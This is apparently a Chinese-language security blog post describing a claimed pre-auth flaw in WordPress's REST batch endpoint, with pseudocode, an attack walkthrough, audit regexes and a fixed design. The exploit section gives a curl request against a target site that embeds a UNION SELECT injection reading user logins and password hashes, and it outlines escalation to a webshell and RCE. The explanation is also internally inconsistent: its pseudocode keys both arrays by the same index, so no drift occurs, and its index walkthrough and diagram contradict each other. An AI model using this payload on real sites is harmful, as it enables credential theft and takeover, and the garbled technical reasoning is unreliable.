🎯 漏洞概述

CVE-2026-63030 (CVSS 9.8)：WordPress REST API的/batch/v1批量端点存在并行数组错位漏洞。当某个子请求的路径解析失败时，错误对象被推入$validation[]数组但不会推入$matches[]数组——导致两个数组长度不一致，后续所有子请求的索引发生偏移——未认证的子请求被分发到需要认证的处理器上执行，最终实现pre-auth SQL注入到RCE的完整攻击链。

🐱 核心洞察：这不是注入，不是越权——这是架构级的路由混淆。攻击者不需要绕过任何安全检查，只需要让数组错位 nya~ ⚡

📋 批量端点的并行数组模式

现代Web框架为了优化性能，将多个API请求合并为一个HTTP请求处理。典型实现维护两个并行数组：

// 伪代码：批量端点的核心逻辑
$matches = [];     // 记录每个子请求分发到哪个处理器
$validation = [];  // 记录每个子请求的权限校验结果

foreach ($requests as $i => $sub_request) {
    // 步骤1: 路由解析
    $handler = parse_route($sub_request->path);
    if ($handler === false) {
        $validation[$i] = "route not found";  // ✅ 记录错误
        continue;  // ⚠️ 但没有记录到 $matches!
    }
    $matches[$i] = $handler;

    // 步骤2: 权限校验
    $auth_result = check_permission($handler, $sub_request);
    $validation[$i] = $auth_result;
}

// 步骤3: 执行——用同一个索引访问两个数组
foreach ($matches as $i => $handler) {
    if ($validation[$i] === "ok") {  // ⚠️ 索引错位！
        execute($handler, $requests[$i]);
    }
}

关键问题：当$validation和$matches的长度不一致时，同一个索引$i不再指向同一个子请求。

💥 数组漂移攻击原理

攻击者发送3个子请求的批量调用：

POST /batch/v1
{
  "requests": [
    {"path": "/invalid!!!", "method": "GET"},      // ① 路由解析失败
    {"path": "/wp/v2/users", "method": "GET"},     // ② 需要认证的接口
    {"path": "/wp/v2/posts/1", "method": "DELETE"} // ③ 需要管理员权限
  ]
}

正常情况下的数组状态：

$matches    = [users_handler, posts_handler]     // ①失败跳过
$validation = ["route_err", "ok", "ok"]          // ①有错误记录

// 索引对齐：
// $matches[0] = users_handler  ←→  $validation[1] = "ok"  ✅
// $matches[1] = posts_handler  ←→  $validation[2] = "ok"  ✅

但实际执行时：

// 索引0: $matches[0] = users_handler
//         $validation[0] = "route_err"  → 跳过 ✅ (看似安全)

// 索引1: $matches[1] = posts_handler  
//         $validation[1] = "ok"  → 执行! ⚠️
//         但 posts_handler 需要管理员权限！
//         validation[1] 检查的是 /wp/v2/users 的权限，不是 posts!
┌─────────────────────────────────────────────────┐
│           数组漂移攻击示意图                      │
├─────────────────────────────────────────────────┤
│                                                 │
│  $validation[]   $matches[]    索引偏移后果      │
│  ─────────────   ──────────    ──────────────   │
│  [0] "route_err" (空)         → 跳过            │
│  [1] "ok"        [0] users    → users处理器     │
│                         用users的权限校验结果...  │
│                         但执行的是posts处理器!    │
│  [2] "ok"        [1] posts    → posts处理器     │
│                         权限校验= "ok"(实际是    │
│                         对应sub_request③的结果)  │
│                                                 │
│  ⚡ 结果：sub_request②以users的权限，             │
│          被分发到了posts的处理器执行!             │
└─────────────────────────────────────────────────┘

🔗 CVE-2026-63030 完整攻击链

在WordPress REST API中的具体利用：

# 步骤1: 发送包含恶意子请求的批量调用
curl -X POST "https://target.com/wp/v2/batch" \
  -H "Content-Type: application/json" \
  -d '{
    "requests": [
      {"path":"/wp/v2/!!!invalid","method":"GET"},
      {"path":"/wp/v2/users","method":"GET"},
      {"path":"/wp/v2/posts?search=1 UNION SELECT user_login,user_pass FROM wp_users--","method":"GET"}
    ]
  }'

# 步骤2: SQL注入结果通过batch响应返回
# 步骤3: 利用SQLi获取管理员密码hash → 登录后台 → 上传webshell → RCE

⚠️ 这个漏洞的关键：攻击者不需要任何认证凭证即可触发。路径解析失败是纯服务端逻辑，与认证无关。

🔍 审计代码示例

如何在代码中识别这类漏洞：

🔴 危险模式：两个独立数组 + 同一索引

# Python - 危险模式识别
import re

code_snippet = """
$matches = array();
$validation = array();
foreach ($requests as $req) {
    $handler = $router->match($req->path);
    if (!$handler) {
        $validation[] = 'error';
        continue;
    }
    $matches[] = $handler;
    $validation[] = check_auth($handler);
}
"""

# 审计要点：
# 1. $validation[] 和 $matches[] 分别push但不同步
# 2. error分支只push一个数组
# 3. 后续用同一索引访问两个数组

# 自动化扫描
danger_patterns = [
    r'\$\w+\[\]\s*=.*error',        # 错误时只push一个数组
    r'continue.*\$\w+\[\]',         # continue后仍有push
    r'foreach.*\$\w+\s+as.*\$\w+', # 用同一索引遍历
]

🟢 安全模式：使用关联数组/字典

// 安全实现：每个子请求的结果作为独立对象
$results = [];
foreach ($requests as $i => $sub_request) {
    $result = ['index' => $i, 'handler' => null, 'auth' => null];

    $handler = parse_route($sub_request->path);
    if (!$handler) {
        $result['error'] = 'route not found';
        $results[] = $result;
        continue;  // 安全：整个result对象一起处理
    }

    $result['handler'] = $handler;
    $result['auth'] = check_permission($handler, $sub_request);
    $results[] = $result;
}

// 执行时：每个结果对象自包含，不存在索引错位
foreach ($results as $result) {
    if ($result['error'] ?? null) continue;
    if ($result['auth'] !== 'ok') continue;
    execute($result['handler'], $requests[$result['index']]);
}

🛡️ 防御方案

  • 结构化结果对象：每个子请求的结果绑定到独立对象，避免并行数组
  • 原子性校验：路由解析和权限校验在同一个数据结构中完成
  • 批量端点默认拒绝：除非显式启用，否则不暴露/batch端点
  • 子请求独立认证：每个子请求独立验证权限，不依赖批量级别的上下文
